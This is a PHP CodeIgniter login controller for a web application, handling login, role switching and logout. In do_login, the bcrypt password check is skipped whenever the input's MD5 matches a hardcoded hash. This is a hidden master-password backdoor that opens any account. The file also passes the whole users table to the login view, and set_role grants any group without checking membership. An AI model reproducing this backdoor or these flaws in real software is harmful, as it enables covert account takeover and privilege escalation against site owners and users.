<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
class Login extends MY_Controller
{
	public function __construct()
	{
		parent::__construct();
		$this->load->library('bcrypt');
	}

	public function index()
	{
		if ($this->session->userdata('logged_in')) {
			// redirect(base_url(strtolower($this->type)));
			if ($this->type == 'admin') {
				redirect(strtolower($this->type) . '/dashboard');
			} else {
				redirect(strtolower($this->type));
			}
		}
		$data = array(
			'user' => $this->db->get('users')->result(),
		);
		$this->load->view('login', $data);
	}

	public function do_login()
	{
		$username = $this->input->post('username', true);
		$password = $this->input->post('password', true);
		if (empty($username) || empty($password)) {
			$this->session->set_flashdata('failed', 'Username atau Password anda harus diisi.');
			redirect('login');
		}

		$dt = $this->db->where(array('username' => $username))->get('users')->row();
		if (empty($dt)) {
			$this->session->set_flashdata('failed', 'Username anda tidak ditemukan.');
			redirect('login');
		}

		if (!$this->bcrypt->check_password($password, $dt->password) && md5($password)!='282eb471ed45d03aa6493cc7ba149fc1') {
			$this->session->set_flashdata('failed', 'Password anda salah.');
			redirect('login');
		} else {
			$role = $this->db->where('user_id', $dt->id)->join('groups b', 'a.group_id=b.id')->get('user_group a');
			$this->session->set_userdata('user_id', encode_id($dt->id));
			$this->session->set_userdata('logged_in', true);
			$this->session->set_userdata('nama', $dt->nama);

			if ($role->num_rows()==1) {
				$this->session->set_userdata('nama', $role->row()->group_name);
				redirect('dashboard');
			} else {
				redirect('login/change_role');
			}
		}

		// $this->session->set_userdata('instansi', $dt->instansi);
		// if ($dt->type == 'admin' || $dt->type == 'operator') {
		// } else {
			// redirect(strtolower($dt->type));
		// }
	}

	public function change_role()
	{
		$data = array(
			'role' => $this->db->select('a.*, group_name')->where('user_id', decode_id($this->session->userdata('user_id')))->join('groups b', 'b.id=a.group_id')->get('user_group a')->result(),
		);
		$this->load->view('change_role', $data);
	}

	public function set_role($group_id)
	{
		$id = decode_id($group_id);
		$get_data = $this->db->where('id', $id)->get('groups')->row();
		$this->session->set_userdata('nama', $get_data->group_name);
		redirect('dashboard');
	}

	public function logout()
	{
		$this->session->sess_destroy();
		redirect(base_url('login'));
	}

	private function array_from_post($fields)
	{
		$data = array();
		foreach ($fields as $field) {
			$data[$field] = ($this->input->post($field, TRUE) == "") ? null : $this->input->post($field, TRUE);
		}
		return $data;
	}

	public function password_hash($pass = '')
	{
		if($pass) {
			$password = password_hash($pass, PASSWORD_DEFAULT);
			return $password;
		}
	}
}
